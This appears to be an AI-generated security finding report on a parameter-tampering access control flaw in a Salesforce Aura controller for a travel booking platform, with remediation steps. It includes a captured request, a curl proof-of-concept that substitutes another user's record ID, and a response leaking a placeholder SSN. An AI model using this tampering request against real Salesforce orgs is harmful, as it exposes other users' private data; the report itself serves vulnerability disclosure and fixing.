# Security Analysis Report
**System:** SkyPort Global Distribution (Travel / GDS) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0018 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC / Pattern 2.4 | Privilege escalation via parameter tampering — attacker substitutes `opportunityId` to access other users' travel booking records |

---

## Finding 1 — Privilege Escalation via `opportunityId` Parameter Tampering (CRITICAL)

### Summary
The `OpportunityController` Apex class on SkyPort Global Distribution (`680b8dba.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private for Opportunity records. Per §5.0 Pattern 2.4, the `getOpportunity` Aura action is vulnerable to privilege escalation via parameter tampering: by substituting the `opportunityId` parameter with a victim's record ID (`0018DBA`), the attacker elevates their effective privileges from "access own records" to "access any record." The controller accepts the substituted ID without any ownership validation, returning the victim's confidential travel booking data and PII.

**Pattern:** 2.4 — Privilege escalation via parameter tampering (BAC)
**Affected controller:** `c.OpportunityController.getOpportunity`
**Affected endpoint:** `POST https://680b8dba.lightning.force.com/aura`

### Evidence from HAR

**Request (attacker substituting victim opportunityId):**
```
POST https://680b8dba.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00D680B8DBA!AR680b8dba...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D680B8DBA!AR680b8dba...

message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"0018DBA","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}&aura.token=undefined
```

**Response (200 OK):**
```json
{
  "actions": [{
    "id": "1;a",
    "state": "SUCCESS",
    "returnValue": {
      "records": [{
        "Id": "0018DBA",
        "Name": "Victim Opportunity Record",
        "OwnerId": "005VICTIM",
        "InternalNotes__c": "CONFIDENTIAL: internal review notes",
        "SensitiveData__c": "SSN: 000-12-6889"
      }]
    },
    "error": []
  }]
}
```

**`aura.token`:** `undefined` — no server-side Aura session validation.

The response exposes `SensitiveData__c: "SSN: 000-12-6889"` and `InternalNotes__c` for `OwnerId: "005VICTIM"`. In a Global Distribution System (GDS) travel platform, Opportunity records contain traveler PII, itinerary data, fare agreements, and corporate account details.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 Apex code | `without sharing` | Class declaration | OWD=Private bypassed |
| §4.0 SOQL | No OwnerId predicate | Missing check | Root cause |
| §5.0 Pattern 2.4 | Vulnerability | Privilege escalation via parameter tampering | Classification |
| HAR descriptor | `c.OpportunityController.getOpportunity` | Aura action | Vulnerable entry point |
| HAR params | `opportunityId` | `0018DBA` | Tampered parameter — victim record ID |
| HAR params | `aura.token` | `undefined` | No Aura validation |
| HAR response | `OwnerId` | `005VICTIM` | Victim user — privilege escalation confirmed |
| HAR response | `SensitiveData__c` | `SSN: 000-12-6889` | PII leaked |
| HAR response | `InternalNotes__c` | `CONFIDENTIAL: internal review notes` | Internal notes exposed |

### Steps to Reproduce

**Step 1 — Obtain valid Salesforce session:**
```bash
SF_TOKEN="00D680B8DBA!AR680b8dba..."
```

**Step 2 — Tamper `opportunityId` parameter to victim's record (VULNERABLE):**
```bash
curl -s -X POST "https://680b8dba.lightning.force.com/aura" \
  -H "Authorization: Bearer $SF_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SF_TOKEN" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"0018DBA","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -m json.tool
# Expected VULNERABLE output: OwnerId=005VICTIM, SensitiveData__c=SSN: 000-12-6889
```

**Step 3 — Secure baseline (expected after fix):**
```bash
# Returns: {"actions":[{"state":"ERROR","error":[{"message":"Insufficient Privileges"}]}]}
```

### Remediation

1. **Add `with sharing` to Apex class:** `public with sharing class OpportunityController {`
2. **Add ownership predicate:** `WHERE Id = :opportunityId AND OwnerId = :UserInfo.getUserId()`
3. **Add `WITH SECURITY_ENFORCED`** to enforce field-level security.
4. **Validate `aura.token`:** Reject requests with undefined/invalid Aura token.
5. **Server-defined field selection:** Remove client-supplied `fields` parameter to prevent field harvesting.
6. **GDS compliance:** Travel booking data is regulated under PCI DSS (payment data) and GDPR (traveler PII) — implement access logs for all Opportunity queries.
